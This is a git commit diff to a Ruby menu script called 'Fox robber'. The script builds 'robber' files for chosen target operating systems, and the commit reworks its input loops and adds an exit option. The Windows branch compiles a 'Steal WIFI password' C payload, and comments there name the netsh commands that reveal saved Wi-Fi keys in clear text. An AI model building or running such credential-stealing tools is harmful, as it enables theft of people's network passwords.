5c5bbd4eb34314a8fd0e6a1f89c570921a8edc03
Mr-Fox-h <mr.fox@iran.ir>
2021-05-02 18:21:46 +0430

    9 commit

--- Fox robber.rb
+++ Fox robber.rb
@@ -11,7 +11,7 @@ module All
   class Help
     def help
       system('clear')
-      puts "** First enter 1 or fox-robber to make robber file.\n** Then you see a lot of option to make robber file.\n** It to fucking easy.\n[0]. back"
+      puts "** First enter 1 or fox-robber to make robber file.\n** Then you see a lot of option to make robber file.\n** It too fucking easy.\n[0]. back"
     end
   end
 end
@@ -30,38 +30,47 @@ while true
     system('clear')
     puts "Enter target OS:\n[4]. Windows\n[5]. Mac\n[6]. Linux\n[7]. Android\n[8]. IOS\n[0]. Back"
     job = 'fox-robber'
-    print "(#{job})>"
-    command_fox_robber = gets.chomp
     while true
-      if %w[0 back].include?(command_fox_robber)
-        system('clear')
-        break
-      else
-        case command_fox_robber
-        when '4', 'windows'
-          system('clear')
-          puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
-          job = 'fox-robber [windows]'
-          print "(#{job})>"
-          command_windows = gets.chomp
-          case command_windows
-          when '9', 'steal wifi password'
-            puts 'Loading...'
-            #'netsh wlan show profile'
-            #'netsh wlan show profile WiFi-name key=clear'
-            system('gcc Windows/Windows_Steal\ WIFI\ password.c')
-            system('mv a.out Windows_s.out')
-            system('chmod +x Windows_s.out')
-            system('mv Windows_s.out Out/')
+      job = 'fox-robber'
+      print "(#{job})>"
+      command_fox_robber = gets.chomp
+      if %w[4 back].include?(command_fox_robber)
+        while true
+          if %w[0 back].include?(command_fox_robber)
             system('clear')
-            puts 'File made by Fox Robber 🦊'
-            system("echo \"\t<Press enter>\" | lolcat -a")
-            gets.chomp
             break
-          when '0', 'back'
-            break
+          else
+            case command_fox_robber
+            when '4', 'windows'
+              system('clear')
+              puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
+              job = 'fox-robber [windows]'
+              print "(#{job})>"
+              command_windows = gets.chomp
+              case command_windows
+              when '9', 'steal wifi password'
+                puts 'Loading...'
+                # netsh wlan show profile
+                # netsh wlan show profile WiFi-name key=clear
+                system('gcc Windows/Windows_Steal\ WIFI\ password.c')
+                system('mv a.out Windows_s.out')
+                system('chmod +x Windows_s.out')
+                system('mv Windows_s.out Out/')
+                system('clear')
+                puts 'File made by Fox Robber 🦊'
+                system("echo \"\t<Press enter>\" | lolcat -a")
+                gets.chomp
+                break
+              when '0', 'back'
+                break
+              end
+            end
           end
         end
+        break
+      else
+        puts $error
+        system('sleep 1')
       end
     end
   when '2', 'help'
@@ -77,7 +86,6 @@ while true
       else
         puts $error
         system('sleep 1')
-        print "(#{job})>"
       end
     end
   when '3', 'explain'
@@ -93,11 +101,13 @@ while true
       else
         puts $error
         system('sleep 1')
-        print "(#{job})>"
       end
     end
   when '0', 'back'
     next
+  when 'exit'
+    system('clear')
+    exit
   else
     puts $error
     system('sleep 1')
